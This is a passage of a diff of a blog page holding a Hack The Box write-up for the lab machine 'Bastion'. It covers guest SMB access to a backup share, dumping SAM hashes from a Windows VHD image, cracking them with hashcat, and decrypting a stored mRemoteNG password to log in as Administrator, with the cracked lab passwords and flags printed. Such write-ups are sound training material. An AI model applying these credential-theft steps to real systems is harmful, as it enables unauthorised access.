+</span></span><span class=line><span class=cl> -r--r--r--        <span class=m>5418299392</span> Fri Feb <span class=m>22</span> 13:45:32 <span class=m>2019</span>    9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+</span></span><span class=line><span class=cl> -r--r--r--       <span class=m>1186</span> Fri Feb <span class=m>22</span> 13:45:32 <span class=m>2019</span>    BackupSpecs.xml
+</span></span><span class=line><span class=cl> <span class=o>[</span> ... <span class=o>]</span>
+</span></span></code></pre></div><p>Opening <em>note.txt</em>, you’ll find another clue on how you may want to continue.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ smbclient //10.10.10.134/Backups -U guest
+</span></span><span class=line><span class=cl>smb: &gt; dir
+</span></span><span class=line><span class=cl>smb: &gt; get note.txt
+</span></span><span class=line><span class=cl>smb: &gt; <span class=nb>exit</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ cat note.txt
+</span></span><span class=line><span class=cl> Sysadmins: please don<span class=err>&#39;</span>t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
+</span></span></code></pre></div><p>So we want to have a look at the back-ups.</p><h2 id=analysing-the-back-ups>Analysing the back-ups <a href=#analysing-the-back-ups>¶</a></h2><p>The small back-up file ‘9b9cfbc<strong>3</strong>-369e-11e9-a17c-806e6f6e6963.vhd’ is a recovery image, which Windows usually creates when you create a back-up image.</p><p>The interesting image however is ‘9b9cfbc<strong>4</strong>-369e-11e9-a17c-806e6f6e6963.vhd’.
+As the note said, downloading this file might fail. In my case I was never able to download more than 75% of the vhd using the get command in smbclient.</p><p>What worked for me is adding the share as a remote disk and using rsync to copy the image to my system (as rsync allows you to continue failed downloads) for analysis.<br>However, there are tools available which’ll allow you to browse through an image without having to download the whole image to your disk.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo mkdir /mnt/vhd
+</span></span><span class=line><span class=cl>$ sudo mount -t cifs -o <span class=nv>user</span><span class=o>=</span>guest //10.10.10.134/Backups /mnt/vhd/
+</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> /mnt/vhd/WindowsImageBackup/L4mpje-PC/Backup<span class=se>\ </span>2019-02-22<span class=se>\ </span>124351/
+</span></span><span class=line><span class=cl>$ rsync --append 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd ~/Documents/Projects/HackTheBox_eu/134-Bastion/
+</span></span><span class=line><span class=cl>$ sudo umount /mnt/vhd
+</span></span><span class=line><span class=cl>$ <span class=nb>cd</span>  ~/Documents/Projects/HackTheBox_eu/134-Bastion/
+</span></span><span class=line><span class=cl>$ sudo vhdimount 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd /mnt/vhd/
+</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> /mnt/vhd/
+</span></span><span class=line><span class=cl>$ ls
+</span></span><span class=line><span class=cl>$ mmls -aB vhdi1
+</span></span><span class=line><span class=cl> DOS Partition Table
+</span></span><span class=line><span class=cl> Offset Sector: <span class=m>0</span>
+</span></span><span class=line><span class=cl> Units are in 512-byte sectors
+</span></span><span class=line><span class=cl> Slot   Start    End     Length    Size  Description
+</span></span><span class=line><span class=cl> 002: 000:000  <span class=m>0000000128</span>  <span class=m>0031248511</span>  <span class=m>0031248384</span>  0014G  NTFS / exFAT <span class=o>(</span>0x07<span class=o>)</span>
+</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> 128*512 <span class=p>|</span> bc
+</span></span><span class=line><span class=cl> <span class=m>65536</span>
+</span></span><span class=line><span class=cl>$ sudo mkdir /mnt/dd
+</span></span><span class=line><span class=cl>$ sudo mount -o ro,noload,offset<span class=o>=</span><span class=m>65536</span> -t nfts vhdi1 /mnt/dd
+</span></span></code></pre></div><p>We can now browse through the contents of the image.</p><h2 id=cracking-hashes>Cracking hashes <a href=#cracking-hashes>¶</a></h2><p>I start of by looking for password hashes.<br>These can be retrieved by cracking the SAM (Security Account Manager) file, which is located at <code>C:\Windows\System32\config</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>cd</span> /mnt/dd/Windows/System32/config/
+</span></span><span class=line><span class=cl>$ samdump2 SYSTEM SAM &gt; ~/Documents/Projects/HackTheBox_eu/134-Bastion/hashes.txt
+</span></span><span class=line><span class=cl>$ cat ~/Documents/Projects/HackTheBox_eu/134-Bastion/hashes.txt
+</span></span><span class=line><span class=cl> *disabled * Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class=line><span class=cl> *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class=line><span class=cl> L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ hashcat -m <span class=m>1000</span> -a <span class=m>0</span> SAM-hashes.txt
+</span></span><span class=line><span class=cl>$ cat ~/.hashcat/hashcat.potfile
+</span></span><span class=line><span class=cl> 26112010952d963c8dc4217daec986d9:bureaulampje
+</span></span></code></pre></div><p>We now have the password of the user <em>L4mpje</em> (&ldquo;lampje&rdquo; = &ldquo;small lightbulb&rdquo; in Dutch), which is <em>bureaulampje</em> (&ldquo;small desk lamp&rdquo; in Dutch).</p><h2 id=-got-the-user-flag>$ Got the user flag <a href=#-got-the-user-flag>¶</a></h2><p>I use this password to SSH onto the box and find the users.txt file containing the flag on the user’s desktop.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ssh L4mpje@10.10.10.134 <span class=c1># enter password bureaulampje</span>
+</span></span><span class=line><span class=cl>L4mpje@BASTION C:<span class=se>\U</span>sers<span class=se>\L</span>4mpje&gt; <span class=nb>type</span> C:<span class=se>\U</span>sers<span class=se>\L</span>4mpje<span class=se>\D</span>esktop<span class=se>\u</span>sers.txt
+</span></span><span class=line><span class=cl> 9bfe57d5c3309db3a151772f9d86c6cd
+</span></span></code></pre></div><h2 id=-going-for-the-root-flag># Going for the root flag <a href=#-going-for-the-root-flag>¶</a></h2><p>While browsing through the filesystem, I noticed mRemoteNG was installed.<br>This is also confirmed by running this small line of PowerShell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>L4mpje@BASTION C:<span class=se>\U</span>sers<span class=se>\L</span>4mpje<span class=se>\D</span>ownloads&gt; powershell
+</span></span><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\L</span>4mpje<span class=se>\D</span>ownloads&gt; Get-ItemProperty HKLM:<span class=se>\S</span>oftware<span class=se>\W</span>ow6432Node<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\C</span>urrentVersion<span class=se>\U</span>ninstall<span class=se>\*</span> <span class=p>|</span> Select-Object DisplayName, DisplayVersion, Publisher, InstallDate <span class=p>|</span> Format-Table –AutoSize
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>DisplayName                                                    DisplayVersion Publisher                InstallDate              
+</span></span><span class=line><span class=cl>-----------                                                    -------------- ---------                -----------              
+</span></span><span class=line><span class=cl>mRemoteNG                                                      1.76.11.40527  Next Generation Software <span class=m>20190222</span>                 
+</span></span><span class=line><span class=cl>Microsoft Visual C++ <span class=m>2008</span> Redistributable - x86 9.0.30729.6161 9.0.30729.6161 Microsoft Corporation    <span class=m>20190416</span>
+</span></span></code></pre></div><p>Searching for vulnerabilities on <a href=https://www.exploit-db.com/ target=_blank rel=noopener>exploit-db</a> didn’t reveal anything,
+but a quick Google search did bring me to an interesting <a href=https://www.reddit.com/r/mRemoteNG/comments/66hzoe/mremoteng_password_storage_is_insecure/ target=_blank rel=noopener>Reddit post</a>.<br>The Ruby script in the post didn’t seem to work for me, but I finally found a <a href=https://github.com/kmahyyg/mremoteng-decrypt target=_blank rel=noopener>Python script on GitHub</a> which did.</p><p>I downloaded confCons.xml from the host and ran the script to find the password for the Administrator account.
+I then logged in onto the hosting using the Administrator password to retrieve the flag from the Administrator’s desktop.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ scp -T L4mpje@10.10.10.134:<span class=s2>&#34;C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml&#34;</span> ./
+</span></span><span class=line><span class=cl>$ cat confCons.xml
+</span></span><span class=line><span class=cl>$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw<span class=o>==</span>
+</span></span><span class=line><span class=cl> Password: thXLHM96BeKL0ER2
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ ssh Administrator@10.10.10.134
+</span></span><span class=line><span class=cl>administrator@BASTION C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator&gt; <span class=nb>type</span> Desktop<span class=se>\r</span>oot.txt
+</span></span><span class=line><span class=cl> 958850b91811676ed6620a9c430e65c8
+</span></span></code></pre></div><blockquote><p>Whatever you are, be a good one.<br>~ Abraham Lincoln</p></blockquote></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://sequr.be/tags/hackthebox.eu/>HackTheBox.eu</a></span>
 <span class=tag><a href=https://sequr.be/tags/machine/>Machine</a></span>
 <span class=tag><a href=https://sequr.be/tags/bastion/>Bastion</a></span>
-<span class=tag><a href=https://sequr.be/tags/l4mpje/>L4mpje</a></span>
-</p>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
-<span class=tag><a href=https://sequr.be/categories/writeup/>Writeup</a></span>
-<span class=tag><a href=https://sequr.be/categories/hack-the-box/>Hack The Box</a></span>
-</p>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
-1016 Words
-</p>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
-2019-08-07
-</p>
-</div>
-<hr>
-<div class=sharing-buttons>
-<a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsequr.be%2fblog%2f2019%2f08%2fbastion%2f" target=_blank rel=noopener aria-label title="Share on facebook">
-<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
-</div>
-</div>
-</a>
-<a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fsequr.be%2fblog%2f2019%2f08%2fbastion%2f" target=_blank rel=noopener aria-label title="Share on twitter">
-<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
-<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
-</div>
-</div>
-</a>
-<a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fsequr.be%2fblog%2f2019%2f08%2fbastion%2f&resubmit=true&title=Bastion" target=_blank rel=noopener aria-label title="Share on reddit">
-<div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg>
-</div>
-</div>
-</a>
-<a class=resp-sharing-button__link href="whatsapp://send?text=Bastion%20https%3a%2f%2fsequr.be%2fblog%2f2019%2f08%2fbastion%2f" target=_blank rel=noopener aria-label title="Share on whatsapp">
-<div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg>
-</div>
-</div>
-</a>
-</div>
-<div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h></span>
-<hr>
-</div>
-<div class=pagination__buttons>
-<span class="button previous">
-<a href=https://sequr.be/blog/2019/08/writeup/>
-<span class=button__icon>←</span>
-<span class=button__text>Writeup</span>
-</a>
-</span>
-</div>
-</div>
-</main>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class=footer__content>
-<span>&copy; 2019-2022</span>
+<span class=tag><a href=https://sequr.be/tags/l4mpje/>L4mpje</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg><span class=tag><a href=https://sequr.be/categories/writeup/>Writeup</a></span>
+<span class=tag><a href=https://sequr.be/categories/hack-the-box/>Hack The Box</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>1016 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2019-08-07</p></div><hr><div class=sharing-buttons><a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsequr.be%2fblog%2f2019%2f08%2fbastion%2f" target=_blank rel=noopener aria-label title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fsequr.be%2fblog%2f2019%2f08%2fbastion%2f" target=_blank rel=noopener aria-label title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fsequr.be%2fblog%2f2019%2f08%2fbastion%2f&resubmit=true&title=Bastion" target=_blank rel=noopener aria-label title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg></div></div></a><a class=resp-sharing-button__link href="whatsapp://send?text=Bastion%20https%3a%2f%2fsequr.be%2fblog%2f2019%2f08%2fbastion%2f" target=_blank rel=noopener aria-label title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg></div></div></a></div><div class=pagination><div class=pagination__title><span class=pagination__title-h></span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://sequr.be/blog/2019/08/writeup/><span class=button__icon>←</span>
+<span class=button__text>Writeup</span></a></span></div></div></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2019-2022</span>
 <span><a href=https://sequr.be>DezeStijn</a></span>
-<span>
-<a href=https://sequr.be/blog/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg>
-</a>
-</span>
-</div>
-</div>
-<div class=footer__inner>
-<div class=footer__content>
-<small>
-<span>Powered by <a href='\"http://gohugo.io\"'>Hugo</a>.</span>
-<span>Made with &#10084; by <a href='\"https://github.com/rhazdon\"'>Djordje Atlialp</a></span>
-<br>
-<span>Deployed using <a href=https://github.com/TheGroundZero/TheGroundZero.github.io/ title=TheGroundZero/TheGroundZero.github.io>GitHub Pages</a></span>
-</small>
-</div>
-</div>
-</footer>
-</div>
-<script type=text/javascript src=https://sequr.be/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
-</body>
-</html>
+<span><a href=https://sequr.be/blog/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><small><span>Powered by <a href='\"http://gohugo.io\"'>Hugo</a>.</span>
+<span>Made with &#10084; by <a href='\"https://github.com/rhazdon\"'>Djordje Atlialp</a></span><br><span>Deployed using <a href=https://github.com/TheGroundZero/TheGroundZero.github.io/ title=TheGroundZero/TheGroundZero.github.io>GitHub Pages</a></span></small></div></div></footer></div><script type=text/javascript src=https://sequr.be/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l+qxcnN3UWK6NyURtxH+ovdgjyFuaKZ7si1g=="></script></body></html>
